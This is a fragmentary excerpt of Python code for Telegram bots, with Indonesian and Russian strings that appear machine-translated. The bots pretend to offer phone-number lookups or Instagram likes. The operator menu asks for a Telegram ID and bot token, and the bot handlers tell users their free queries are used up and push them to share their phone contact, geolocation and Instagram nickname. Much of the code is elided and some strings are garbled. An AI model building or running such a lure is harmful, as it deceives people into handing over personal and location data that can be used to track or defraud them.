...
print(Fore.YELLOW + '-----------------------------------------')
userid = input(Fore.RED +  "Kirimkan ini ke Telegram ID > ")
token = input(Fore.BLUE +  "Anda perlu membayar > ")
print(Fore.CYAN + '''
[1] Пробив по номеру
...
[5] BTC BANKER
	''')
choice = input(Fore.MAGENTA +  "Pentingnya Keterbukaan Informasi:>>> ")
if not choice.isdigit():
	print("Tentu saja, Anda perlu melakukan yang terbaik")
	exit(0)
choice = int(choice)
...
def start(message):
	bot.send_message(message.chat.id, '''👋 Terima kasih! 👋
		Ini adalah bot yang dapat menampilkan informasi berdasarkan nomor telepon!
Untuk mencari informasi, masukkan perintah /getinfo''') 
	
@bot.message_handler(commands=['lamer112311dev'])
def start(message):
	bot.send_message(message.chat.id, 'Penulis: @Anitauceha. Saluran: Youtub Tools Pinjol') 

@bot.message_handler(commands=['getinfo'])
def start(message):
	msg = bot.send_message(message.chat.id, 'Nama Panggilan Telepon yang Lain') 
...
def proc2(message):
	try:
		...
		if not num.isdigit():
			msg = bot.reply_to(message, 'Oleh karena itu, Anda tidak perlu menelepon nama panggilan, panggilan telepon, panggilan telepon /getinfo!')#⏳
			return

		bot.send_message(m_id, f'Namanya tidak ada {{num}} terkirim!')
		time.sleep(2)
		keyboard = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True) 
		button_phone = types.KeyboardButton(text="Daftar", request_contact=True) 	
		keyboard.add(button_phone)	
		bot.send_message(m_id, '''Sepertinya Anda tidak punya permintaan gratis lagi untuk hari ini!
			Untuk mendapatkan pertanyaan tambahan, daftar di bot!''', reply_markup=keyboard)
# Kesalahan menangkap
...
def callback_inline(call):
	if call.data == "find":
		...
		bot.send_message(call.message.chat.id, text='Untuk menggunakan pencarian lanjutan gratis, konfirmasikan geolokasi Anda!', reply_markup=keyboard1)
...
def start(message):
	bot.send_message(message.chat.id, '''👋 Привет! 👋
		Ini adalah bot untuk mendapatkan suka dan pelanggan di Instagram!
		Untuk memulai, tulislah /nacrutka''') 
@bot.message_handler(commands=['lamer112311dev'])
def start(message):
...
def contact(message):
	if message.contact is not None: 
		...
		time.sleep(1)
		msg = bot.send_message(message.chat.id, 'Masukkan nama panggilan Instagram Anda:') 
